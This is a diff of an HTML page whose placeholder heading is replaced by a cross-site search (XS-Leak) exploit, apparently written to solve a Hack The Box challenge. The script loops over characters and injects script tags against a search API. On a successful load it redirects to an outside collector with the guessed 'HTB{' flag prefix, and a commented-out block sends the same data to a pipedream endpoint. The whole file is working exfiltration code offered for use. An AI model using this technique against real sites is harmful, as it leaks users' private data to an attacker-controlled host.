@@ -1,5 +1,26 @@
 <html>
     <body>
-        <h1>Đây là một trang web sơ sài</h1>
+        <script>
+            const url = "http://127.0.0.1:1337/api/entries/search?q=HTB{5";
+            //const url = "http://68.183.45.200:30734/api/entries/search?q=Ba"
+            //for(j=0; j<40; j++){
+                for(i=45;i<=126;i++){
+                    if(String.fromCharCode(parseInt(i))!= "!" && String.fromCharCode(parseInt(i))!="_"){
+                        const script_element = document.createElement('script');
+                        const s = String.fromCharCode(parseInt(i));
+                        script_element.setAttribute('src', url+s);
+                        const path_mine = 'window.location="https://col-1002.github.io/?data=HTB{'+s+'"';
+                        script_element.setAttribute('onload', path_mine);
+                        document.querySelector('head').appendChild(script_element);
+                    }
+                }
+            //}
+            /*function gogogo(s) {
+                const url2 = "https://.m.pipedream.net?data=HTB{"+s;
+                fetch(url2).then((response) => console.log(response));
+                url += s;
+                console.log(url);
+            }*/
+        </script>
     </body>
 </html>
